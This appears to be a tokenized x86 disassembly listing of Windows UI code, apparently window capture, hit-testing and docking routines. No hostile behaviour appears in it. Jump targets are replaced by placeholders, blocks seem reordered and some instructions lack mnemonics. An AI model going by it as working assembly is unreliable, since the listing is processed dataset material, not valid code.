mov [ edx ] eax
push ebp
call sub_4292f0
pop ecx
mov edx [ ebp - 0xc ]
mov [ edx + 0x4 ] eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_42929c
test al al
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43c264
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43c550
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_429394
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c2bc
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx 0x8
call sub_44ba74
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_4293dc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x1
jne r-xdata
call GetDesktopWindow
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call GetTopWindow
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43c464
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42929c
test al al
je r-xdata
push 0x2
mov eax [ ebp - 0x14 ]
push eax
call GetWindow
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ eax + edx * 4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_42946c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
pop ecx
pop ecx
pop ebp
retn
sub_4294dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_429574
call sub_41a528
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call SetCapture
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_429520
push ebp
mov ebp esp
add esp 0xfffffef8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x8 ]
call sub_44cd04
mov esp ebp
pop ebp
retn
sub_429574
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429651
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_42a980
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_42a240
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0x10 ]
call sub_42a240
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
xor eax eax
call sub_42a980
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_42a240
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_42a980
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_429690
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xfff3
mov [ ebp - 0x8 ] 0xfff4
jmp r-xdata
mov ax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_4296f0
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_429734
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42946c
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
sub_429770
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffe2
call sub_44c24c
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4297a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffe4
call sub_44c24c
xor eax eax
mov [ ebp - 0x8 ] eax
sub_4297e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xfff3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x6a ]
mov [ ebp - 0x8 ] ax
jmp r-xdata
mov ax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_42981c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42983c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x48 ]
test eax eax
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_4365e8
sub_429868
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x48 ]
test eax eax
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_4365c8
sub_429894
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4296f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f184
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov edx 0xffffff
xor eax eax
call sub_417034
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_40f338
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_429908
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_429944
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_429734
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x54 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x58 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6c ] al
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ edx + 0x44 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
lea esi [ eax + 0x5c ]
lea edi [ edx + 0x5c ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4299d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffe7
call sub_44c24c
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429a00
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_429a38
push ebp
mov ebp esp
add esp 0xffffffe4
push esi
push edi
mov esi edx
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jg r-xdata
push ebp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
sub edx [ eax + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
sub eax [ ecx + 0xc ]
call sub_429a00
pop ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
push ebp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
sub edx [ eax + 0x10 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
sub eax [ ecx + 0x10 ]
call sub_429a00
pop ecx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
call OffsetRect
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_429aec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffe0
call sub_44c24c
pop ebx
pop ecx
pop ebp
retn
sub_429b0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffdf
call sub_44c24c
pop ebx
pop ecx
pop ebp
retn
sub_429b64
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetWindowRect
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ eax + 0x14 ] 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
jmp r-xdata
sub_429bf8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_42a070
mov [ ebp - 0x1c ] eax
push 0x4
mov eax [ ebp - 0x1c ]
push eax
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x24 ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_428e90
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_434714
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x20 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_434714
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_434714
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x44 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffc1
call sub_44c24c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov [ ebp - 0x18 ] edx
mov edx [ eax - 0x8 ]
mov [ ebp - 0x14 ] edx
lea eax [ ebp - 0x24 ]
push eax
push sub_429b64
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_434714
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x90 ]
call sub_434714
cmp eax [ ebp - 0x1c ]
je r-xdata
sub_429dbc
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_434714
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_434714
push eax
call IsChild
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
sub_429e08
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x11
call GetKeyState
test ax 0x8000
setne [ ebp - 0x1d ]
cmp [ rw-data ] 0x0
sete al
or al [ ebp - 0x1d ]
jne r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4293dc
mov [ ebp - 0x18 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_429bf8
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_43c464
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_434714
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_429dbc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov bx 0xffc1
call sub_44c24c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43292c
dec eax
jle r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_429330
sub_429f64
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ rw-data ] eax
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_43c2dc
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43c264
jmp r-xdata
sub_429fd4
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] 0x2
sete al
mov [ ebp - 0x14 ] al
lea eax [ ebp - 0x24 ]
push eax
xor eax eax
mov al [ ebp - 0x5 ]
push eax
push 0xb02f
mov eax [ ebp - 0x4 ]
push eax
call SendMessageA
mov [ ebp - 0x10 ] eax
sub_42a03c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetPropA
test eax eax
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42a070
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_42a03c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call GetParent
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_42a0b4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_429e08
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a070
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_429fd4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
call sub_434714
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
sub_42a120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] al
mov [ ebp - 0x2 ] 0x0
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x2 ]
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov dl [ ebp - 0x1 ]
call sub_429fd4
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x2 ] al
sub_42a170
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x140 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
call sub_43284c
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
call sub_43284c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_42ac70
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x140 ]
call sub_43c464
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
